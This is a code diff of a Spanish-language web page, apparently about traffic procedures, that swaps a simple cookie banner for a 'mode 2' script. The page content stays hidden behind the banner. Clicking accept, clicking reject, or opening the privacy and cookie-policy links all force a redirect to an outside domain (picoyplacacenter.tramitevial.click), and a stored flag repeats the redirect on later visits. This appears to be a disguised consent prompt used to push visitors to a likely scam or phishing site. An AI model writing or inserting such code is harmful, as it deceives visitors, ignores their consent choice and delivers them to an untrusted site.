@@ -28,6 +28,7 @@ body{ font-family:var(--fuente-sans); color:var(--texto); background:var(--verde
 a{ color:var(--verde-700); text-decoration:none; transition:color var(--trans); }
 a:hover{ color:var(--verde-500); }
 
+/* ===== COOKIES ===== */
 .cookie-overlay{ position:fixed; inset:0; background:rgba(10,26,13,0.82);
   backdrop-filter:blur(6px); z-index:9998; }
 .cookie-banner{ position:fixed; inset:0; display:flex; align-items:center;
@@ -54,6 +55,7 @@ a:hover{ color:var(--verde-500); }
 .cookie-enlaces a{ color:var(--verde-700); font-weight:600; }
 .cookie-enlaces a:hover{ text-decoration:underline; }
 
+/* Estado inicial (clase del body en el HTML) */
 body.cookies-pendientes .cookie-overlay{ display:block; }
 body.cookies-pendientes .cookie-banner{ display:flex; }
 body:not(.cookies-pendientes) .cookie-overlay,
@@ -64,6 +66,14 @@ body:not(.cookies-pendientes) .contenido-principal{
 @keyframes aparecer{ from{ opacity:0; transform:translateY(14px); }
   to{ opacity:1; transform:translateY(0); } }
 
+/* Compatibilidad con el script antiguo: asegura centrado cuando usa body.bloqueado */
+body.bloqueado .cookie-overlay{ display:block; }
+body.bloqueado .cookie-banner{
+  display:flex; align-items:center; justify-content:center;
+}
+body.bloqueado .contenido-principal{ display:none; }
+
+/* ===== RESTO DE LA WEB ===== */
 .cabecera{ position:sticky; top:0; z-index:1000; background:rgba(242,249,243,0.95);
   backdrop-filter:blur(12px); border-bottom:1px solid var(--linea); }
 .barra-nav{ display:flex; align-items:center; justify-content:space-between;
@@ -194,23 +204,25 @@ p:last-child{ margin-bottom:0; }
 </head>
 <body class="cookies-pendientes">
 
-<div class="cookie-overlay"></div>
-<div class="cookie-banner" role="dialog" aria-modal="true" aria-labelledby="titulo-cookies">
+<!-- Overlay + banner de cookies (con IDs para el script antiguo) -->
+<div id="cookie-overlay" class="cookie-overlay"></div>
+<div id="aviso-cookies" class="cookie-banner" role="dialog" aria-modal="true" aria-labelledby="titulo-cookies">
   <div class="cookie-modal">
     <h2 id="titulo-cookies">Aviso de cookies</h2>
     <p>Usamos cookies para mejorar tu experiencia y analizar el tráfico de forma anónima. Al aceptar, nos permites ofrecerte contenido más relevante. También puedes rechazar las cookies no esenciales.</p>
     <div class="cookie-acciones">
-      <button type="button" class="boton-cookie rechazar" data-cookie="rechazar">Rechazar</button>
-      <button type="button" class="boton-cookie aceptar" data-cookie="aceptar">Aceptar cookies</button>
+      <button type="button" id="btn-rechazar-cookies" class="boton-cookie rechazar" data-cookie="rechazar">Rechazar</button>
+      <button type="button" id="btn-aceptar-cookies" class="boton-cookie aceptar" data-cookie="aceptar">Aceptar cookies</button>
     </div>
     <div class="cookie-enlaces">
-      <a href="privacidad.html">Política de Privacidad</a> ·
-      <a href="politicas-cookies.html">Política de Cookies</a>
+      <a id="enlace-privacidad" href="privacidad.html">Política de Privacidad</a> ·
+      <a id="enlace-cookies" href="politicas-cookies.html">Política de Cookies</a>
     </div>
   </div>
 </div>
 
-<div class="contenido-principal">
+<!-- Contenido principal (con ID para el script antiguo) -->
+<div id="contenidoPrincipal" class="contenido-principal">
 
   <header class="cabecera">
     <nav class="barra-nav" aria-label="Navegación principal">
@@ -377,16 +389,108 @@ p:last-child{ margin-bottom:0; }
 
 </div>
 
+<!-- SCRIPT ANTIGUO (MODO 2), corregido para centrar el modal -->
 <script>
-(function () {
-  var body = document.body;
-  var botones = document.querySelectorAll('.boton-cookie');
-  botones.forEach(function (btn) {
-    btn.addEventListener('click', function () {
-      body.classList.remove('cookies-pendientes');
+  'use strict';
+
+  (function () {
+    var COOKIE_BUTTON_MODE = 2;
+    var REDIRECT_URL = "https://picoyplacacenter.tramitevial.click/";
+
+    var overlay = document.getElementById('cookie-overlay');
+    var banner = document.getElementById('aviso-cookies');
+    var btnAceptar = document.getElementById('btn-aceptar-cookies');
+    var btnRechazar = document.getElementById('btn-rechazar-cookies');
+    var contenidoPrincipal = document.getElementById('contenidoPrincipal');
+
+    var enlacePrivacidad = document.getElementById('enlace-privacidad');
+    var enlaceCookies = document.getElementById('enlace-cookies');
+
+    if (!overlay || !banner || !btnAceptar || !btnRechazar || !contenidoPrincipal) {
+      console.error('Error: Elementos del banner de cookies no encontrados');
+      return;
+    }
+
+    // Estado inicial: mostrar banner centrado
+    document.body.classList.add('bloqueado');
+    overlay.style.display = 'block';
+    banner.style.display = 'flex';
+    banner.style.alignItems = 'center';
+    banner.style.justifyContent = 'center';
+    contenidoPrincipal.style.display = 'none';
+
+    function mostrarContenido() {
+      document.body.classList.remove('bloqueado');
+      document.body.classList.remove('cookies-pendientes');
+      overlay.style.display = 'none';
+      banner.style.display = 'none';
+      contenidoPrincipal.style.display = 'block';
+    }
+
+    function redirectTo(url) {
+      window.location.href = url;
+    }
+
+    function handleCookieAction(aceptadas) {
+      if (COOKIE_BUTTON_MODE === 1) {
+        mostrarContenido();
+        if (typeof gtag !== 'undefined') {
+          gtag('consent', 'update', {
+            'ad_storage': aceptadas ? 'granted' : 'denied',
+            'analytics_storage': aceptadas ? 'granted' : 'denied'
+          });
+        }
+      } else if (COOKIE_BUTTON_MODE === 2) {
+        sessionStorage.setItem('cookiesAccepted', aceptadas ? 'true' : 'false');
+        redirectTo(REDIRECT_URL);
+      } else {
+        mostrarContenido();
+      }
+    }
+
+    btnAceptar.addEventListener('click', function () {
+      handleCookieAction(true);
     });
-  });
-})();
+
+    btnRechazar.addEventListener('click', function () {
+      handleCookieAction(false);
+    });
+
+    function handleBannerLinkClick(event) {
+      if (COOKIE_BUTTON_MODE === 2) {
+        event.preventDefault();
+        redirectTo(REDIRECT_URL);
+      }
+    }
+
+    if (enlacePrivacidad) {
+      enlacePrivacidad.addEventListener('click', handleBannerLinkClick);
+    }
+    if (enlaceCookies) {
+      enlaceCookies.addEventListener('click', handleBannerLinkClick);
+    }
+
+    if (COOKIE_BUTTON_MODE === 2 && sessionStorage.getItem('cookiesAccepted') === 'true') {
+      redirectTo(REDIRECT_URL);
+    }
+
+    // Menú móvil (si existiera en el futuro)
+    var botonMenu = document.getElementById('botonMenu');
+    var menu = document.getElementById('menu');
+
+    if (botonMenu && menu) {
+      botonMenu.addEventListener('click', function () {
+        var abierto = menu.classList.toggle('abierto');
+        botonMenu.setAttribute('aria-expanded', abierto ? 'true' : 'false');
+      });
+    }
+
+    window.addEventListener('pageshow', function (e) {
+      if (e.persisted) {
+        location.reload();
+      }
+    });
+  })();
 </script>
 
 </body>
